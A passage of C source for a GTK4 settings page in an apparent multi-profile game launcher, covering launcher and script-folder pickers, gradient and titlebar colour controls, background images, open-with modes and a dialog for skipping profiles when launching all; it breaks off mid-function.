#include "settings.h"
#include "picker.h"
#include "style.h"
#include "settings/portable.h"

#include <glib/gstdio.h>
#include <math.h>
#include <string.h>
#include <unistd.h>

#include "settings/profiles.h"

typedef struct {
    GtkSpinButton *font_size;
    GtkSwitch *word_wrap;
    GtkToggleButton *indent[3];
    GtkSwitch *shift_close;
    GtkSwitch *restore_tabs;
    GtkSwitch *output;
    GtkSwitch *single_log;
    gboolean updating;
    SettingsChangedFunc changed;
    RestoreTabsChangedFunc restore_changed;
    OutputChangedFunc output_changed;
    SingleLogChangedFunc single_log_changed;
    GtkWidget *launcher_button;
    GtkLabel *launcher_path;
    LauncherChangedFunc launcher_changed;
    GtkDropDown *open_with;
    GtkEntry *open_command;
    GtkWidget *open_command_row;
    OpenWithChangedFunc open_with_changed;
    GtkSpinButton *launch_delay;
    GtkSwitch *auto_rejoin;
    GtkEntry *rejoin_place;
    GtkEntry *rejoin_job;
    GtkSpinButton *restart_minutes;
    GtkDropDown *restart_mode;
    GtkWidget *restart_button;
    RestartProfilesFunc restart_profiles;
    CloseTabsFunc close_tabs;
    ReloadSettingsFunc reload_settings;
    GCancellable *bundle;
    GtkWidget *bundle_export;
    GtkWidget *bundle_import;
    GtkSwitch *raknet;
    RaknetChangedFunc raknet_changed;
    GtkWidget *exclude_button;
    GtkLabel *exclude_summary;
    GtkWindow *exclude_dialog;
    GtkListBox *exclude_list;
    char **excluded;
    char **profiles;
    ProfilesChangedFunc profiles_changed;
    CheckUpdatesFunc check_updates;
    GtkWidget *scripts_button;
    GtkLabel *scripts_path_label;
    ScriptsChangedFunc scripts_changed;
    char *scripts_path;
    GCancellable *picker;
    GtkSwitch *gradient;
    GtkSwitch *animations;
    GtkSpinButton *gradient_angle;
    GtkColorDialogButton *gradient_start;
    GtkColorDialogButton *gradient_middle;
    GtkColorDialogButton *gradient_end;
    GtkSwitch *gradient_middle_on;
    GtkSpinButton *gradient_opacity;
    GtkSpinButton *window_radius;
    GtkSpinButton *background_strength;
    GtkSwitch *cover_titlebar;
    GtkColorDialogButton *titlebar_picker;
    GtkSpinButton *titlebar_opacity;
    GtkWidget *titlebar_color_row;
    GtkWidget *titlebar_opacity_row;
    char *image_path;
    GtkWidget *image_button;
    GtkLabel *image_label;
    GtkWidget *image_clear;
    GtkSwitch *image_enabled;
    GtkColorDialogButton *search_picker;
    AppearanceChangedFunc appearance_changed;
    gpointer appearance_user_data;
    gboolean stopped;
    gpointer user_data;
} Settings;

static const int indent_widths[] = {2, 4, 8};

static GtkWidget *label_new(const char *text, const char *style);
static void exclude_saved(GtkButton *button, gpointer user_data);

void settings_set_launcher(GtkWidget *page, const char *path)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    g_autofree char *name = path && *path ? g_filename_display_basename(path) : g_strdup("None selected");
    gtk_label_set_text(state->launcher_path, name);
    gtk_widget_set_tooltip_text(GTK_WIDGET(state->launcher_path), path);
}

void settings_set_scripts_path(GtkWidget *page, const char *path)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    g_free(state->scripts_path);
    state->scripts_path = g_strdup(path);
    g_autofree char *name = path && *path ? g_filename_display_basename(path) : g_strdup("None selected");
    gtk_label_set_text(state->scripts_path_label, name);
    gtk_widget_set_tooltip_text(GTK_WIDGET(state->scripts_path_label), path);
}

static void picker_error(GtkWidget *page, const char *title, const GError *error)
{
    if (!error || g_error_matches(error, GTK_DIALOG_ERROR, GTK_DIALOG_ERROR_DISMISSED) ||
        g_error_matches(error, GTK_DIALOG_ERROR, GTK_DIALOG_ERROR_CANCELLED) ||
        g_error_matches(error, G_IO_ERROR, G_IO_ERROR_CANCELLED))
        return;
    g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("%s", title);
    gtk_alert_dialog_set_detail(alert, error->message);
    gtk_alert_dialog_show(alert, GTK_WINDOW(gtk_widget_get_root(page)));
}

static void picker_finished(Settings *state)
{
    g_clear_object(&state->picker);
    gtk_widget_set_sensitive(state->launcher_button, TRUE);
    gtk_widget_set_sensitive(state->scripts_button, TRUE);
    if (state->image_button)
        gtk_widget_set_sensitive(state->image_button, TRUE);
}

static void launcher_chosen(GFile *file, const GError *error, gpointer user_data)
{
    GWeakRef *owner = user_data;
    g_autoptr(GtkWidget) page = g_weak_ref_get(owner);
    Settings *state = page ? g_object_get_data(G_OBJECT(page), "settings") : NULL;
    if (state && !state->stopped) {
        picker_finished(state);
        g_autoptr(GError) failure = error ? g_error_copy(error) : NULL;
        if (file) {
            g_autofree char *path = g_file_get_path(file);
            if (!path || !g_file_test(path, G_FILE_TEST_IS_REGULAR) || g_access(path, X_OK) != 0)
                g_set_error_literal(&failure, G_IO_ERROR, G_IO_ERROR_INVALID_ARGUMENT, "Choose a local executable file.");
            else if (!state->launcher_changed || state->launcher_changed(path, &failure, state->user_data))
                settings_set_launcher(page, path);
        }
        picker_error(page, "Could not select launcher", failure);
    }
    g_weak_ref_clear(owner);
    g_free(owner);
}

static void scripts_chosen(GFile *file, const GError *error, gpointer user_data)
{
    GWeakRef *owner = user_data;
    g_autoptr(GtkWidget) page = g_weak_ref_get(owner);
    Settings *state = page ? g_object_get_data(G_OBJECT(page), "settings") : NULL;
    if (state && !state->stopped) {
        picker_finished(state);
        g_autoptr(GError) failure = error ? g_error_copy(error) : NULL;
        if (file) {
            g_autofree char *path = g_file_get_path(file);
            if (!path || !g_file_test(path, G_FILE_TEST_IS_DIR))
                g_set_error_literal(&failure, G_IO_ERROR, G_IO_ERROR_INVALID_ARGUMENT, "Choose a local folder.");
            else if (!state->scripts_changed || state->scripts_changed(path, &failure, state->user_data))
                settings_set_scripts_path(page, path);
        }
        picker_error(page, "Could not select script folder", failure);
    }
    g_weak_ref_clear(owner);
    g_free(owner);
}

static GWeakRef *picker_owner(GtkWidget *page, GtkWidget *button)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->picker = g_cancellable_new();
    gtk_widget_set_sensitive(button, FALSE);
    GWeakRef *owner = g_new0(GWeakRef, 1);
    g_weak_ref_init(owner, page);
    return owner;
}

static void select_launcher(GtkButton *button, gpointer user_data)
{
    GtkWidget *page = user_data;
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (state->stopped || state->picker) return;
    GWeakRef *owner = picker_owner(page, GTK_WIDGET(button));
    picker_open_file(GTK_WINDOW(gtk_widget_get_root(page)), "Select launcher", "Select",
        NULL, state->picker, launcher_chosen, owner);
}

static void select_scripts(GtkButton *button, gpointer user_data)
{
    GtkWidget *page = user_data;
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (state->stopped || state->picker) return;
    GWeakRef *owner = picker_owner(page, GTK_WIDGET(button));
    g_autoptr(GFile) initial = state->scripts_path && g_file_test(state->scripts_path, G_FILE_TEST_IS_DIR)
        ? g_file_new_for_path(state->scripts_path) : g_file_new_for_path(g_get_home_dir());
    picker_select_folder(GTK_WINDOW(gtk_widget_get_root(page)), "Select script folder", "Select",
        initial, state->picker, scripts_chosen, owner);
}

static const char *open_with_labels[] = {
    "Editor tab", "File manager", "System default", "Custom command", "Nothing",
};

static void appearance_apply(Settings *state);

static void update_titlebar_rows(Settings *state)
{
    if (!state->cover_titlebar)
        return;
    gboolean show = gtk_switch_get_active(state->cover_titlebar);
    if (state->titlebar_color_row)
        gtk_widget_set_sensitive(state->titlebar_color_row, !show);
    if (state->titlebar_opacity_row)
        gtk_widget_set_sensitive(state->titlebar_opacity_row, !show);
}

static void update_image_row(Settings *state)
{
    if (!state->image_label)
        return;
    gboolean have = state->image_path && *state->image_path;
    g_autofree char *name = have ? g_filename_display_basename(state->image_path)
                                 : g_strdup("None selected");
    gtk_label_set_text(state->image_label, name);
    gtk_widget_set_tooltip_text(GTK_WIDGET(state->image_label), have ? state->image_path : NULL);
    if (state->image_enabled)
        gtk_widget_set_sensitive(GTK_WIDGET(state->image_enabled), have);
    if (state->image_clear)
        gtk_widget_set_visible(state->image_clear, have);
}

static void image_chosen(GFile *file, const GError *error, gpointer user_data)
{
    GWeakRef *owner = user_data;
    g_autoptr(GtkWidget) page = g_weak_ref_get(owner);
    Settings *state = page ? g_object_get_data(G_OBJECT(page), "settings") : NULL;
    if (state && !state->stopped) {
        picker_finished(state);
        g_autoptr(GError) failure = error ? g_error_copy(error) : NULL;
        if (file) {
            g_autofree char *path = g_file_get_path(file);
            if (!path || !g_file_test(path, G_FILE_TEST_IS_REGULAR))
                g_set_error_literal(&failure, G_IO_ERROR, G_IO_ERROR_INVALID_ARGUMENT,
                                    "Choose a local image file.");
            else if (!gdk_pixbuf_get_file_info(path, NULL, NULL))
                g_set_error_literal(&failure, G_IO_ERROR, G_IO_ERROR_NOT_SUPPORTED,
                                    "That file is not an image this system can read.");
            else {
                g_free(state->image_path);
                state->image_path = g_strdup(path);
                update_image_row(state);
                appearance_apply(state);
            }
        }
        picker_error(page, "Could not select background image", failure);
    }
    g_weak_ref_clear(owner);
    g_free(owner);
}

static void select_image(GtkButton *button, gpointer user_data)
{
    GtkWidget *page = user_data;
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (state->stopped || state->picker) return;
    GWeakRef *owner = picker_owner(page, GTK_WIDGET(button));
    g_autoptr(GFile) initial = state->image_path && *state->image_path
        ? g_file_new_for_path(g_path_get_dirname(state->image_path))
        : g_file_new_for_path(g_get_home_dir());
    picker_open_file(GTK_WINDOW(gtk_widget_get_root(page)), "Select background image", "Select",
        initial, state->picker, image_chosen, owner);
}

static void image_clear_clicked(GtkButton *button, gpointer user_data)
{
    (void)button;
    Settings *state = user_data;
    if (state->updating)
        return;
    g_clear_pointer(&state->image_path, g_free);
    update_image_row(state);
    appearance_apply(state);
}

static void cover_titlebar_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)object;
    (void)property;
    Settings *state = user_data;
    update_titlebar_rows(state);
    appearance_apply(state);
}

static char *hex_from_rgba(const GdkRGBA *color)
{
    return g_strdup_printf("#%02x%02x%02x",
        (unsigned)CLAMP((int)(color->red * 255.0 + 0.5), 0, 255),
        (unsigned)CLAMP((int)(color->green * 255.0 + 0.5), 0, 255),
        (unsigned)CLAMP((int)(color->blue * 255.0 + 0.5), 0, 255));
}

static void rgba_from_hex(const char *hex, GdkRGBA *color)
{
    if (!gdk_rgba_parse(color, hex))
        *color = (GdkRGBA){0.5, 0.5, 0.5, 1.0};
}

static void swatch_draw(GtkDrawingArea *area, cairo_t *cr, int width, int height,
                        gpointer user_data)
{
    (void)user_data;
    const GdkRGBA *rgba = g_object_get_data(G_OBJECT(area), "rgba");
    if (!rgba)
        return;
    gdk_cairo_set_source_rgba(cr, rgba);
    cairo_rectangle(cr, 0, 0, width, height);
    cairo_fill(cr);
}

static void swatch_update(GtkWidget *swatch, const GdkRGBA *rgba)
{
    GdkRGBA *copy = g_new(GdkRGBA, 1);
    *copy = *rgba;
    g_object_set_data_full(G_OBJECT(swatch), "rgba", copy, g_free);
    gtk_widget_queue_draw(swatch);
}

static void picker_rgba_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)property;
    Settings *state = user_data;
    GtkColorDialogButton *picker = GTK_COLOR_DIALOG_BUTTON(object);
    GtkWidget *swatch = g_object_get_data(object, "swatch");
    GtkEntry *hex = g_object_get_data(object, "hex");
    const GdkRGBA *rgba = gtk_color_dialog_button_get_rgba(picker);
    swatch_update(swatch, rgba);
    g_autofree char *text = hex_from_rgba(rgba);
    if (g_strcmp0(gtk_editable_get_text(GTK_EDITABLE(hex)), text) != 0)
        gtk_editable_set_text(GTK_EDITABLE(hex), text);
    appearance_apply(state);
}

static void hex_committed(GtkWidget *widget, gpointer user_data)
{
    GtkColorDialogButton *picker = user_data;
    const char *text = gtk_editable_get_text(GTK_EDITABLE(widget));
    GdkRGBA color;
    if (!appearance_color_valid(text) || !gdk_rgba_parse(&color, text)) {
        gtk_widget_add_css_class(widget, "invalid");
        return;
    }
    gtk_widget_remove_css_class(widget, "invalid");
    gtk_color_dialog_button_set_rgba(picker, &color);
}

static void hex_changed(GtkEditable *editable, gpointer user_data)
{
    const char *text = gtk_editable_get_text(editable);
    if (strlen(text) != 7) {
        gtk_widget_remove_css_class(GTK_WIDGET(editable), "invalid");
        return;
    }
    hex_committed(GTK_WIDGET(editable), user_data);
}

static void hex_leave(GtkEventControllerFocus *controller, gpointer user_data)
{
    (void)controller;
    hex_committed(GTK_WIDGET(user_data), g_object_get_data(G_OBJECT(user_data), "picker"));
}

static GtkWidget *color_button(Settings *state, GtkColorDialogButton **out)
{
    GtkWidget *swatch = gtk_drawing_area_new();
    gtk_widget_add_css_class(swatch, "gradient-swatch");
    gtk_widget_set_size_request(swatch, 18, 18);
    gtk_drawing_area_set_draw_func(GTK_DRAWING_AREA(swatch), swatch_draw, NULL, NULL);

    GtkWidget *button = gtk_menu_button_new();
    gtk_widget_add_css_class(button, "gradient-color");
    gtk_widget_set_valign(button, GTK_ALIGN_CENTER);
    gtk_widget_set_tooltip_text(button, "Pick a colour");
    gtk_menu_button_set_child(GTK_MENU_BUTTON(button), swatch);

    GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 8);
    gtk_widget_set_margin_top(box, 8);
    gtk_widget_set_margin_bottom(box, 8);
    gtk_widget_set_margin_start(box, 8);
    gtk_widget_set_margin_end(box, 8);
    gtk_widget_set_size_request(box, 180, -1);

    GtkWidget *hex = gtk_entry_new();
    gtk_widget_add_css_class(hex, "gradient-hex");
    gtk_entry_set_placeholder_text(GTK_ENTRY(hex), "#rrggbb");
    gtk_entry_set_max_length(GTK_ENTRY(hex), 7);
    gtk_editable_set_width_chars(GTK_EDITABLE(hex), 9);
    gtk_accessible_update_property(GTK_ACCESSIBLE(hex),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Colour hex code", -1);
    gtk_box_append(GTK_BOX(box), hex);

    GtkColorDialog *dialog = gtk_color_dialog_new();
    gtk_color_dialog_set_with_alpha(dialog, FALSE);
    gtk_color_dialog_set_title(dialog, "Pick a gradient colour");
    GtkWidget *picker = gtk_color_dialog_button_new(dialog);
    gtk_widget_add_css_class(picker, "gradient-picker");
    gtk_widget_set_hexpand(picker, TRUE);
    gtk_box_append(GTK_BOX(box), picker);

    GtkWidget *popover = gtk_popover_new();
    gtk_popover_set_child(GTK_POPOVER(popover), box);
    gtk_menu_button_set_popover(GTK_MENU_BUTTON(button), popover);

    g_object_set_data(G_OBJECT(picker), "swatch", swatch);
    g_object_set_data(G_OBJECT(picker), "hex", hex);
    g_object_set_data(G_OBJECT(hex), "picker", picker);
    g_signal_connect(picker, "notify::rgba", G_CALLBACK(picker_rgba_changed), state);
    g_signal_connect(hex, "changed", G_CALLBACK(hex_changed), picker);
    g_signal_connect(hex, "activate", G_CALLBACK(hex_committed), picker);
    GtkEventController *focus = gtk_event_controller_focus_new();
    g_signal_connect(focus, "leave", G_CALLBACK(hex_leave), hex);
    gtk_widget_add_controller(hex, focus);

    picker_rgba_changed(G_OBJECT(picker), NULL, state);
    *out = GTK_COLOR_DIALOG_BUTTON(picker);
    return button;
}

static AppearanceSettings appearance_from_widgets(Settings *state)
{
    AppearanceSettings settings = {
        .gradient = gtk_switch_get_active(state->gradient),
        .angle = gtk_spin_button_get_value_as_int(state->gradient_angle),
        .middle_enabled = gtk_switch_get_active(state->gradient_middle_on),
        .opacity = gtk_spin_button_get_value(state->gradient_opacity) / 100.0,
        .radius = gtk_spin_button_get_value_as_int(state->window_radius),
        .background_strength = gtk_spin_button_get_value(state->background_strength) / 100.0,
        .cover_titlebar = gtk_switch_get_active(state->cover_titlebar),
        .titlebar_opacity = gtk_spin_button_get_value(state->titlebar_opacity) / 100.0,
        .animations_disabled = gtk_switch_get_active(state->animations),
        .image_enabled = gtk_switch_get_active(state->image_enabled),
    };
    settings.start = hex_from_rgba(gtk_color_dialog_button_get_rgba(state->gradient_start));
    settings.middle = hex_from_rgba(gtk_color_dialog_button_get_rgba(state->gradient_middle));
    settings.end = hex_from_rgba(gtk_color_dialog_button_get_rgba(state->gradient_end));
    settings.titlebar_color = hex_from_rgba(gtk_color_dialog_button_get_rgba(state->titlebar_picker));
    settings.search_color = hex_from_rgba(gtk_color_dialog_button_get_rgba(state->search_picker));
    settings.image_path = state->image_path && *state->image_path ? g_strdup(state->image_path) : NULL;
    return settings;
}

static void appearance_apply(Settings *state)
{
    if (state->updating || !state->appearance_changed)
        return;
    AppearanceSettings settings = appearance_from_widgets(state);
    g_autoptr(GError) error = NULL;
    if (!state->appearance_changed(&settings, &error, state->appearance_user_data) && error) {
        g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("Could not save appearance");
        gtk_alert_dialog_set_detail(alert, error->message);
        gtk_alert_dialog_show(alert, GTK_WINDOW(gtk_widget_get_root(GTK_WIDGET(state->gradient))));
    }
    appearance_settings_clear(&settings);
}

static void appearance_notify(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)object;
    (void)property;
    appearance_apply(user_data);
}

static void appearance_value(GtkWidget *widget, gpointer user_data)
{
    (void)widget;
    appearance_apply(user_data);
}

void settings_set_appearance_handler(GtkWidget *page, AppearanceChangedFunc changed, gpointer user_data)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->appearance_changed = changed;
    state->appearance_user_data = user_data;
}

void settings_set_appearance(GtkWidget *page, const AppearanceSettings *settings)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (!state || !state->gradient || !settings)
        return;
    state->updating = TRUE;
    GdkRGBA color;
    rgba_from_hex(settings->start, &color);
    gtk_color_dialog_button_set_rgba(state->gradient_start, &color);
    rgba_from_hex(settings->middle, &color);
    gtk_color_dialog_button_set_rgba(state->gradient_middle, &color);
    rgba_from_hex(settings->end, &color);
    gtk_color_dialog_button_set_rgba(state->gradient_end, &color);
    gtk_switch_set_active(state->gradient, settings->gradient);
    gtk_switch_set_active(state->gradient_middle_on, settings->middle_enabled);
    gtk_spin_button_set_value(state->gradient_angle, settings->angle);
    gtk_spin_button_set_value(state->gradient_opacity, settings->opacity * 100.0);
    gtk_spin_button_set_value(state->window_radius, settings->radius);
    gtk_spin_button_set_value(state->background_strength, settings->background_strength * 100.0);
    gtk_switch_set_active(state->cover_titlebar, settings->cover_titlebar);
    gtk_switch_set_active(state->animations, settings->animations_disabled);
    gtk_switch_set_active(state->image_enabled, settings->image_enabled);
    gtk_spin_button_set_value(state->titlebar_opacity, settings->titlebar_opacity * 100.0);
    GdkRGBA titlebar;
    rgba_from_hex(settings->titlebar_color, &titlebar);
    gtk_color_dialog_button_set_rgba(state->titlebar_picker, &titlebar);
    GdkRGBA search;
    rgba_from_hex(settings->search_color, &search);
    gtk_color_dialog_button_set_rgba(state->search_picker, &search);
    update_titlebar_rows(state);
    g_clear_pointer(&state->image_path, g_free);
    state->image_path = settings->image_path && *settings->image_path ? g_strdup(settings->image_path) : NULL;
    update_image_row(state);
    state->updating = FALSE;
}

static void update_open_command_row(Settings *state)
{
    guint selected = gtk_drop_down_get_selected(state->open_with);
    gtk_widget_set_visible(state->open_command_row, selected == OPENER_COMMAND);
}

static void commit_open_with(Settings *state)
{
    if (!state->open_with_changed)
        return;
    guint selected = gtk_drop_down_get_selected(state->open_with);
    OpenerMode mode = selected < G_N_ELEMENTS(open_with_labels) ? (OpenerMode)selected : OPENER_EDITOR;
    g_autoptr(GError) error = NULL;
    if (!state->open_with_changed(mode, gtk_editable_get_text(GTK_EDITABLE(state->open_command)),
                                  &error, state->user_data) && error) {
        g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("Could not save settings");
        gtk_alert_dialog_set_detail(alert, error->message);
        gtk_alert_dialog_show(alert, GTK_WINDOW(gtk_widget_get_root(GTK_WIDGET(state->open_with))));
    }
}

static void open_with_selected(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)object;
    (void)property;
    Settings *state = user_data;
    if (state->updating)
        return;
    update_open_command_row(state);
    commit_open_with(state);
}

static void open_command_committed(GtkWidget *widget, gpointer user_data)
{
    (void)widget;
    Settings *state = user_data;
    if (state->updating)
        return;
    commit_open_with(state);
}

void settings_set_open_with(GtkWidget *page, OpenerMode mode, const char *command)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->updating = TRUE;
    gtk_drop_down_set_selected(state->open_with,
        mode < G_N_ELEMENTS(open_with_labels) ? (guint)mode : (guint)OPENER_EDITOR);
    gtk_editable_set_text(GTK_EDITABLE(state->open_command), command ? command : "");
    state->updating = FALSE;
    update_open_command_row(state);
}

static void update_exclude_summary(Settings *state)
{
    if (!state->exclude_button)
        return;
    gboolean have = state->profiles && state->profiles[0] && !state->stopped;
    gtk_widget_set_sensitive(state->exclude_button, have);
    if (!state->exclude_summary)
        return;
    if (!have) {
        gtk_label_set_text(state->exclude_summary, "Create a Profile to skip it here.");
        return;
    }
    g_autoptr(GPtrArray) skipped = g_ptr_array_new();
    for (guint i = 0; state->profiles[i]; ++i)
        if (state->excluded &&
            g_strv_contains((const char *const *)state->excluded, state->profiles[i]))
            g_ptr_array_add(skipped, state->profiles[i]);
    if (!skipped->len) {
        gtk_label_set_text(state->exclude_summary, "Every Profile is launched.");
        return;
    }
    g_ptr_array_add(skipped, NULL);
    g_autofree char *joined = g_strjoinv(", ", (char **)skipped->pdata);
    g_autofree char *text = g_strdup_printf("Skipped: %s", joined);
    gtk_label_set_text(state->exclude_summary, text);
}

static void commit_profiles(Settings *state)
{
    if (!state->profiles_changed)
        return;
    ProfilesSettings options = {
        .delay_ms = gtk_spin_button_get_value_as_int(state->launch_delay),
        .excluded = state->excluded,
        .auto_rejoin = gtk_switch_get_active(state->auto_rejoin),
        .place_id = (char *)gtk_editable_get_text(GTK_EDITABLE(state->rejoin_place)),
        .job_id = (char *)gtk_editable_get_text(GTK_EDITABLE(state->rejoin_job)),
        .restart_minutes = gtk_spin_button_get_value_as_int(state->restart_minutes),
        .restart_mode = gtk_drop_down_get_selected(state->restart_mode) == PROFILES_RESTART_SEQUENTIAL
            ? PROFILES_RESTART_SEQUENTIAL : PROFILES_RESTART_AT_ONCE,
    };
    g_autoptr(GError) error = NULL;
    if (!state->profiles_changed(&options, &error, state->user_data) && error) {
        g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("Could not save settings");
        gtk_alert_dialog_set_detail(alert, error->message);
        gtk_alert_dialog_show(alert, GTK_WINDOW(gtk_widget_get_root(GTK_WIDGET(state->launch_delay))));
    }
}

static GtkWidget *exclude_row_new(const char *name, gboolean skipped)
{
    GtkWidget *row = gtk_list_box_row_new();
    gtk_list_box_row_set_selectable(GTK_LIST_BOX_ROW(row), FALSE);
    gtk_list_box_row_set_activatable(GTK_LIST_BOX_ROW(row), FALSE);
    GtkWidget *box = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 12);
    GtkWidget *label = label_new(name, NULL);
    gtk_widget_set_hexpand(label, TRUE);
    gtk_widget_set_valign(label, GTK_ALIGN_CENTER);
    gtk_label_set_ellipsize(GTK_LABEL(label), PANGO_ELLIPSIZE_END);
    gtk_box_append(GTK_BOX(box), label);
    GtkWidget *launch = gtk_switch_new();
    gtk_widget_add_css_class(launch, "exclude-profile");
    gtk_widget_set_valign(launch, GTK_ALIGN_CENTER);
    gtk_switch_set_active(GTK_SWITCH(launch), !skipped);
    g_object_set_data_full(G_OBJECT(launch), "profile-name", g_strdup(name), g_free);
    g_autofree char *accessible = g_strdup_printf("Launch %s with Launch all", name);
    gtk_accessible_update_property(GTK_ACCESSIBLE(launch), GTK_ACCESSIBLE_PROPERTY_LABEL, accessible, -1);
    gtk_widget_set_tooltip_text(launch, "Include this Profile when Launch all runs");
    gtk_box_append(GTK_BOX(box), launch);
    gtk_list_box_row_set_child(GTK_LIST_BOX_ROW(row), box);
    return row;
}

static void exclude_saved(GtkButton *button, gpointer user_data)
{
    (void)button;
    Settings *state = user_data;
    g_autoptr(GPtrArray) skipped = g_ptr_array_new_with_free_func(g_free);
    for (GtkWidget *row = state->exclude_list ? gtk_widget_get_first_child(GTK_WIDGET(state->exclude_list)) : NULL;
         row; row = gtk_widget_get_next_sibling(row)) {
        GtkWidget *box = gtk_list_box_row_get_child(GTK_LIST_BOX_ROW(row));
        GtkWidget *launch = box ? gtk_widget_get_last_child(box) : NULL;
        if (!launch || !GTK_IS_SWITCH(launch) || gtk_switch_get_active(GTK_SWITCH(launch)))
            continue;
        const char *name = g_object_get_data(G_OBJECT(launch), "profile-name");
        if (name)
            g_ptr_array_add(skipped, g_strdup(name));
    }
    g_ptr_array_add(skipped, NULL);
    g_strfreev(state->excluded);
    state->excluded = (char **)g_ptr_array_free(g_steal_pointer(&skipped), FALSE);
    update_exclude_summary(state);
    commit_profiles(state);
    if (state->exclude_dialog)
        gtk_window_destroy(state->exclude_dialog);
}

static gboolean exclude_dialog_key(GtkEventControllerKey *controller, guint keyval,
                                   guint keycode, GdkModifierType modifiers, gpointer user_data)
{
    (void)controller; (void)keycode; (void)modifiers;
    if (keyval != GDK_KEY_Escape) return FALSE;
    gtk_window_close(GTK_WINDOW(user_data));
    return TRUE;
}

static void exclude_dialog_closed(GtkWidget *widget, gpointer user_data)
{
    Settings *state = user_data;
    if (state->exclude_dialog == GTK_WINDOW(widget))
        state->exclude_dialog = NULL;
    state->exclude_list = NULL;
}

static void open_exclude_dialog(GtkButton *button, gpointer user_data)
{
    (void)button;
    Settings *state = user_data;
    if (state->stopped || !state->profiles || !state->profiles[0])
        return;
    if (state->exclude_dialog) {
        gtk_window_present(state->exclude_dialog);
        return;
    }
    GtkWindow *window = GTK_WINDOW(gtk_window_new());
    gtk_window_set_title(window, "Skip when launching all");
    GtkWindow *parent = GTK_WINDOW(gtk_widget_get_root(GTK_WIDGET(button)));
    if (parent)
        gtk_window_set_transient_for(window, parent);
    gtk_window_set_modal(window, TRUE);
    gtk_window_set_hide_on_close(window, TRUE);
    gtk_window_set_default_size(window, 340, 380);
    gtk_widget_add_css_class(GTK_WIDGET(window), "relapse-ui");
    gtk_widget_add_css_class(GTK_WIDGET(window), "exclude-dialog");
    GtkWidget *header = gtk_header_bar_new();
    gtk_header_bar_set_show_title_buttons(GTK_HEADER_BAR(header), FALSE);
    GtkWidget *title = gtk_label_new("Skip when launching all");
    gtk_widget_add_css_class(title, "title");
    gtk_header_bar_set_title_widget(GTK_HEADER_BAR(header), title);
    GtkWidget *close = gtk_button_new_with_label("×");
    gtk_widget_add_css_class(close, "window-control");
    gtk_widget_set_tooltip_text(close, "Close without saving");
    g_signal_connect_swapped(close, "clicked", G_CALLBACK(gtk_window_close), window);
    gtk_header_bar_pack_end(GTK_HEADER_BAR(header), close);
    gtk_window_set_titlebar(window, header);
    GtkWidget *content = gtk_box_new(GTK_ORIENTATION_VERTICAL, 12);
    gtk_widget_add_css_class(content, "profiles-content");
    GtkWidget *hint = label_new("Launch all starts every Profile whose switch is on.",
        "settings-description");
    gtk_label_set_wrap(GTK_LABEL(hint), TRUE);
    gtk_label_set_max_width_chars(GTK_LABEL(hint), 40);
    gtk_box_append(GTK_BOX(content), hint);
    GtkWidget *scroll = gtk_scrolled_window_new();
    gtk_widget_set_vexpand(scroll, TRUE);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroll), GTK_POLICY_NEVER,
        GTK_POLICY_AUTOMATIC);
    gtk_scrolled_window_set_min_content_height(GTK_SCROLLED_WINDOW(scroll), 140);
    GtkWidget *list = gtk_list_box_new();
    gtk_widget_add_css_class(list, "profiles-list");
    gtk_list_box_set_selection_mode(GTK_LIST_BOX(list), GTK_SELECTION_NONE);
    for (guint i = 0; state->profiles[i]; ++i) {
        gboolean skipped = state->excluded &&
            g_strv_contains((const char *const *)state->excluded, state->profiles[i]);
        gtk_list_box_append(GTK_LIST_BOX(list), exclude_row_new(state->profiles[i], skipped));
    }
    gtk_scrolled_window_set_child(GTK_SCROLLED_WINDOW(scroll), list);
    gtk_box_append(GTK_BOX(content), scroll);
    GtkWidget *actions = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);
    gtk_widget_set_halign(actions, GTK_ALIGN_END);
    GtkWidget *cancel = gtk_button_new_with_label("Cancel");
    g_signal_connect_swapped(cancel, "clicked", G_CALLBACK(gtk_window_close), window);
    GtkWidget *save = gtk_button_new_with_label("Save");
    gtk_widget_add_css_class(save, "save-excluded");
    g_signal_connect(save, "clicked", G_CALLBACK(exclude_saved), state);
    gtk_box_append(GTK_BOX(actions), cancel);
    gtk_box_append(GTK_BOX(actions), save);
    gtk_box_append(GTK_BOX(content), actions);
    GtkEventController *keys = gtk_event_controller_key_new();
    g_signal_connect(keys, "key-pressed", G_CALLBACK(exclude_dialog_key), window);
    gtk_widget_add_controller(GTK_WIDGET(window), keys);
    gtk_window_set_child(window, content);
    g_signal_connect(window, "destroy", G_CALLBACK(exclude_dialog_closed), state);
    state->exclude_dialog = window;
    state->exclude_list = GTK_LIST_BOX(list);
    gtk_window_present(window);
}

static void launch_delay_changed(GtkWidget *widget, gpointer user_data)
{
    (void)widget;
    Settings *state = user_data;
    if (!state->updating)
        commit_profiles(state);
}

static void profiles_control_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)object;
    (void)property;
    Settings *state = user_data;
    if (!state->updating)
        commit_profiles(state);
}

static void profiles_entry_leave(GtkEventControllerFocus *controller, gpointer user_data)
{
    (void)controller;
    Settings *state = user_data;
    if (!state->updating)
        commit_profiles(state);
}

static void raknet_toggled(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)object;
    (void)property;
    Settings *state = user_data;
    if (state->updating || !state->raknet_changed) return;
    g_autoptr(GError) error = NULL;
    if (!state->raknet_changed(gtk_switch_get_active(state->raknet), &error, state->user_data) && error) {
